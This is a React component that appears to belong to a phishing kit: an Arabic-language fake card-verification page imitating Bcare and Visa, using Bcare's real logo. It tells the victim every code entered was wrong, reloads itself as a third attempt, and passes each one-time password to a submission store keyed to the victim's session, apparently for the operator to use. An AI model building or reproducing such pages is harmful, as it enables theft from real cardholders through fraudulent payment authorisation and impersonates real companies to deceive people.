import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addSubmission } from "@/lib/submissions";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaIncLogo from "../assets/Visa_Inc._logo.svg_1779063055374.png";

export default function Otp3() {
  const [, setLocation] = useLocation();
  const [otpCode, setOtpCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);

  useEffect(() => {
    if (timeLeft === 0) return;
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `0${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.length < 4) return;
    
    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }

    setLoading(true);
    try {
      addSubmission("otp", sessionId, { otpCode, attempt: 3 });
      setTimeout(() => {
        setLocation("/otp3");
        setLoading(false);
        setOtpCode("");
      }, 5000);
    } finally {
      setLoading(false);
    }
  };

  const today = new Date().toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' });

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4">
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/90 backdrop-blur-sm z-50 flex flex-col items-center justify-center"
          >
            <Loader2 className="w-16 h-16 animate-spin text-blue-600 mb-6" />
            <h2 className="text-xl font-bold text-gray-800">جاري معالجة الطلب...</h2>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="bg-white rounded-xl shadow-2xl border border-gray-200 overflow-hidden max-w-md w-full">
        <div className="bg-gray-50 border-b border-gray-200 p-4 flex justify-between items-center">
          <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Bcare" className="h-6" />
          <img src={visaIncLogo} alt="Visa" className="h-6" />
        </div>
        
        <div className="p-8 text-center">
          <div className="bg-blue-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
            </svg>
          </div>
          
          <h2 className="text-2xl font-bold text-gray-800 mb-2">إثبات ملكية البطاقة</h2>
          <p className="text-sm text-gray-600 mb-6 leading-relaxed">
            تم إرسال رمز تحقق إلى رقمك لتأكيد عملية الشراء بتاريخ {today}
          </p>

          <div className="text-red-500 text-sm font-bold mb-4 bg-red-50 p-2 rounded">
            عذراً قمت بـ ادخال رمز تحقق غير صحيح
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <Input 
              type="text" 
              required 
              value={otpCode} 
              onChange={e => setOtpCode(e.target.value.replace(/\D/g, "").substring(0, 6))} 
              placeholder="الرمز المكون من 4 إلى 6 أرقام"
              dir="ltr"
              className="text-center text-xl tracking-[0.5em] h-14 bg-gray-50 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
            />
            
            <div className="text-gray-500 font-mono text-lg flex items-center justify-center gap-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              {formatTime(timeLeft)}
            </div>

            <Button 
              type="submit" 
              className="w-full h-12 text-lg font-bold bg-blue-600 hover:bg-blue-700 text-white rounded-lg"
              disabled={loading || otpCode.length < 4}
            >
              تأكيد
            </Button>
          </form>
        </div>
        
        <div className="bg-gray-50 p-4 text-center text-xs text-gray-500 border-t border-gray-200">
          عملية دفع آمنة ومشفرة
        </div>
      </div>
    </div>
  );
}
